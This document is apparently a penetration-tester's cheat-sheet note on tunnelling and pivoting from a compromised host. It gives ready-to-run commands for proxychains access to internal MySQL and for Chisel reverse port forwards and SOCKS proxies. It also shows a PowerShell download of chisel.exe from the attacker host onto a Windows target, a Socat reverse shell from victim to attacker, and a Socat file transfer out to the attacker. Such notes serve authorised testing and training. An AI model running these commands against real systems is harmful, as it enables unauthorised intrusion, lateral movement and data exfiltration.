---
title: Tunnelling
type: note
tab: Pivoting
inputs: [Shell]
outputs: [Pivot]
tags: [Pivoting, Tunnelling]
---

# Tunnelling

## Proxychains To Internal MySQL

#Shell #Pivoting #Tunnelling
Route local tools through proxychains when MySQL is only reachable through a tunnel or SOCKS proxy.

```sh
# Attacker: edit the proxychains config to point at the active SOCKS proxy.
sudo nano /etc/proxychains4.conf

# Attacker: connect to the internal MySQL listener through proxychains.
proxychains mysql -u root -h 127.0.0.1 --skip-ssl

# Attacker: run a quick query through the tunnel without creating a separate card.
proxychains mysql -u root -h 127.0.0.1 --skip-ssl -e "SHOW DATABASES;"
```

## Chisel Reverse Port Forward

#Shell #Windows #Pivoting #Tunnelling
Expose a Windows-only local service such as `127.0.0.1:3306` back to the attacker box.

1. Start the reverse server on Kali.

```sh
chisel server -p <LPORT> --reverse
```

2. Download and run the Windows client on the target.

```powershell
iwr -Uri http://<LHOST>/chisel.exe -OutFile chisel.exe
.\chisel.exe client <LHOST>:<LPORT> R:3306:127.0.0.1:3306
```

3. Connect to the forwarded service from Kali.

```sh
mysql -u root -h 127.0.0.1 --skip-ssl
```

## Chisel Reverse SOCKS

#Shell #Windows #Pivoting #Tunnelling
Expose a reverse SOCKS proxy through a Windows foothold.

1. Start the reverse server on Kali.

```sh
chisel server -p <LPORT> --reverse
```

2. Start the Windows client with a reverse SOCKS tunnel.

```powershell
.\chisel.exe client <LHOST>:<LPORT> R:socks
```

3. Verify access through the proxy.

```sh
proxychains ping <TARGET_IP>
```

## Socat

#Shell #Linux #Pivoting #Tunnelling
Use Socat for stable reverse shells, simple port forwards, or raw file transfers.

```sh
# Stable reverse shell listener on attacker.
socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>

# Victim reverse shell.
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>

# Port forward local listener to an internal service.
socat tcp-listen:8080,fork tcp:<INTERNAL_HOST>:80

# File transfer receiver and sender.
socat tcp-listen:<LPORT> open:received_file,creat
socat tcp-connect:<LHOST>:<LPORT> file:<FILE>
```

## Notes

- Add Ligolo and SSH dynamic forwarding snippets here when those notes are ready.
